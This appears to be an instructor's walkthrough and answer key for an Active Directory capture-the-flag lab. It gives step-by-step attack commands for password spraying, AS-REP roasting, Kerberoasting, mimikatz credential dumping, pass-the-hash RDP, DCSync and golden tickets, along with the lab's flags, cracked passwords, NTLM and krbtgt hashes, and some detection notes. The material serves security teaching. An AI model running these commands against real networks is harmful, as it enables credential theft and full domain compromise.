# Preparation

1. Install a Kali VM
2. Make sure that you are able to connect your notebook to a physical ethernet
   network while being connected to `eduroam`, `welcome`, or your own Hotspot /
   Tethering for internet. If this is not possible you might be able to connect
   via WiFi to the lab network. A wired connection would be preferred.
3. Make sure you know the basics of TCP and DNS
4. Get familiar with simple `nmap` commands

<!--
2. Install and setup bloodhound (`https://www.kali.org/tools/bloodhound/`)
3. Install `bloodhound.py` (`pip install bloodhound`)
2. Install docker (https://docs.docker.com/engine/install/debian/)
3. Run `sudo usermod -aG docker $USER` and restart the VM (https://docs.docker.com/engine/install/linux-postinstall/#manage-docker-as-a-non-root-user)
4. Install Bloodhound **Community Edition** `curl -L https://ghst.ly/getbhce | docker compose -f - up` (https://github.com/SpecterOps/BloodHound?tab=readme-ov-file#running-bloodhound-community-edition)
-->

## TODO: pre LAB preparation

TODO: disable RDP on srv
    TODO: lena.obstfeld needs to be able to SSH into srv but not as admin
    TODO: felix.frucht needs to be admin and SSHable into srv
    TODO: anna.bluetenbach needs to be admin and RDPable into DC
TODO: golden ticket flag?

1. Make sure DNS only listens on 192.168.8.50
2. Allow admin RDP sessions to DC
    > this should be possible. if not run:
    > `New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0`
3. Get krbtgt NT hash and set as flag
3. Install Sysmon (`sysmon -i`)
4. Configure Sysmon (`sysmon -c sysmonconfig.xml`)
5. Import custom event viewer views
6. Open admin RDP session to srv

7. Make sure RDP and SSH work concurrently

## Sanity Check

Read "Introduction"!

> `flag{50_1337_h4x0r}`

## DC IP

1. Connect to Lab Network
2. Start Kali VM
3. Login with `kali:kali`
4. Open Terminal
5. Run `ip a` to get own ip address
6. Run `nmap -sP 192.168.8.0/24`
7. See `192.168.8.50`
8. Confirm suspicion by SYN scanning `192.168.8.50` (`sudo nmap -sS 192.168.8.50`)

> `flag{192.168.8.50}`

## Domain Recon

1. Open Terminal
2. Run `crackmapexec smb 192.168.8.50 --users`
3. Alternative: Run `enum4linux -U 192.168.8.50`
4. See flag and submit

> `flag{M4st3r_0f_AD_D0m41n_R3c0nn41ss4nc3}`

## Password Spraying

1. Write all usernames to a `users.txt` file
2. Run `crackmapexec smb 192.168.8.50 -u users.txt -p users.txt --no-bruteforce`
3. Run `crackmapexec smb 192.168.8.50 -u users.txt -p 'Sommer2024!'`

> `flag{karl.apfelmann:karl.apfelmann}`
> `flag{karl.apfelmann:Sommer2024!}`

> Mention Lockout Policy

> Lockout for 5 minutes after 300 failed attempts

> **New User:** `karl.apfelmann`

## ASREPRoast

1. Run `impacket-GetNPUsers aafabrik.lab/ -no-pass -usersfile users.txt -dc-ip 192.168.8.50`
2. Copy hashes into `hashes.asreproast`
3. Use JtR
    * `john --wordlist=/usr/share/wordlists/rockyou.txt --format:krb5asrep hashes.asreproast`
    * `john --show hashes.asreproast`

> `flag{cyber4pple}`

> **New User:** `lena.obstfeld`

> * Event 4768 in "Windows Logs > Security"
> * Check Wireshark for `kerberos` traffic

## Kerberoast

### Blind Kerberoast

> Creds required

1. Run `impacket-GetUserSPNs -request -dc-ip 192.168.8.50 aafabrik.lab/karl.apfelmann:Sommer2024!`
2. Copy hash into a `hashes.kerberoast`
3. Run `john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast`
4. Show password `john --show hashes.kerberoast`

> `flag{iloveorangejuice}`

> **New User:** `sophie.weingarten`

> **Detection:**
> * Detect with event `4769` for honey pot accounts
> * Event 4768 in "Windows Logs > Security"
> * Check Wireshark for `kerberos` traffic

## SYSVOL

1. Connect via SSH to srv.aafabrik.lab with gained creds
   (`ssh lena.obstfeld@192.168.58.51`)
2. Navigate to `cd \\aafabrik.lab\SYSVOL\aafabrik.lab`
3. Find Logonscript with Admin Creds (and flag)

-> `flag{L0g0n_AD_Pr1nt3r_M4g1c}`

> **New User:** `felix.frucht` (member of `srvadmins`)

> Detection is hard

## Mimikatz

1. Use creds from *SYSVOL* (felix.frucht) to login via SSH to `srv.aafabrik.lab`
2. Navigate to `C:\` and find `mimikatz.exe`
3. Use `mimikatz.exe` (or `Invoke-Mimikatz`) to gain DC admin NTLM hash
4. `.\mimikatz.exe`
5. `privilege::debug`
6. `sekurlsa::logonpasswords`
7. crack password of `anna.bluetenbach` with john:
8. Place password-hash in file and execute `john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt file.txt`

> `flag{4248897b0c1ee035432fa86a2a7bc36c}`

> **New User:** `anna.bluetenbach` via NTLM hash (member of `dcadmins` and `srvadmins`)

> 1. Install and configure sysmon
> 2. Look for event 10 in Sysmon events (on srv)

## PtH (Lateral Movement)

1. Use `xfreerdp` with `--pth` option to login at `dc.aafabrik.lab` with the
   NTLM hash from *Mimikatz*
   (`xfreerdp /u:anna.bluetenbach /pth:4248897b0c1ee035432fa86a2a7bc36c /d:aafabrik.lab /v:192.168.58.50 /cert-ignore`)
2. DO NOT BREAK STUFF
3. Find flag in `flag.txt` on the Desktop or `C:\`

> `flag{H@shSm@sh_RDP_M@g1c!}`

## DC Sync (Persistence)

1. Use ssh to connect to srv.aafabrik.lab with user-account `anna.bluetenbach`, password must be cracked
2. Copy mimikatz to server via `scp`
3. Use mimikatz to perform DC Sync attack to get the `krbtgt` hash
    1. `lsadump::dcsync /domain:aafabrik.lab /user:krbtgt`

-> Flag is `flag{<krbtgt hash>}` (TODO: set flag after install)
-> Also write down Object Security ID of krbtgt-account

> Can be detected **if *Directory Service Access auditing* is enabled** via the
> event 4662.

## Golden Ticket (Persistence)

1. Use mimikatz ~~or Rubeus~~ to get a Golden Ticket
2. check with klist for presence of the ticket

> `kerberos::golden /user:anna.bluetenbach /domain:aafabrik.lab /sid:<domain_sid> /krbtgt:<krbtgt_hash> /ptt`
> `kerberos::golden /user:anna.bluetenbach /domain:aafabrik.lab /sid:S-1-5-21-1041006367-1593407638-1259114436 /krbtgt:86a6326c38e2da2ce3a781864a4135c2 /ptt`

## Use Golden Ticket (Persistence) (not implemented yet?!)

1. Use Golden Ticket to connect to a share and find flag in txt file

> TODO(jso): take this as inspiration: https://adsecurity.org/?p=2362#more-2362

> Connect via ~~RDP~~ SSH to server w/ low priv account
> find powershell script in SYSVOL with admin creds
> close ~~RDP~~ SSH session
> open new ~~RDP~~ SSH session as admin
> run mimikatz to gain DC admin NTLM hash
> use RDP to connect to DC via PtH (this might be dangerous bc then everyone can mess with the entire domain)
> use mimikatz to perform DC sync attack to gain krbtgt hash
> use mimikatz or Rubeus to get golden ticket
> then access a share and find a flag
> This can be split into multiple challs

